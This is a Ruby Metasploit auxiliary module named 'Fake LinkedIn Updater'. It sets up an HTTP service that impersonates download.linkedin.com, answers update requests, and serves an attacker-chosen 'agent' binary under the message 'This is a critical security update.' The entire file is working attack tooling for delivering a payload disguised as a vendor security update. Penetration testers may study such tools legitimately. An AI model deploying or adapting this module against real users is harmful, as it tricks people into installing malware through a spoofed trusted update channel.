require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake LinkedIn Updater',
			'Version'     => '1.0',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake LinkedIn updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)


		@base = {
			'vh' => ['download.linkedin.com'],
			'request' => [{
				'req' => '/web.dat', 
				'type' => 'file', 
				'method' => '', 
				'bin'    => 0,
				'string' => "",
				'parse' => 1,
				'file' => 'linkedin_web.dat',
			},
			{
				'req' => '.bin', 
				'type' => 'agent', 
				'method' => '', 
				'bin'    => 1,
				'string' => '',
				'parse' => '0',
				'file' => ''
			}
			],
			'options' => {  
				'msg' => { 
					'val' => 'This is a critical security update.', 
					'desc' => 'Update information, You can use some tag <PRODUCT_NAME>,<NEW_PRODUCT_VERSION>,<BR>-'
				},
				'rand1'  => { 
					'val' => 'RndAlpha(RndNum(1))',
					'hidden' => 1,
					'dynamic' =>1,
				},
				'rand2'  => { 
					'val' => 'RndAlpha(RndNum(1))',
					'hidden' => 1,
					'dynamic' =>1,
				}
			}
		}
	end
end
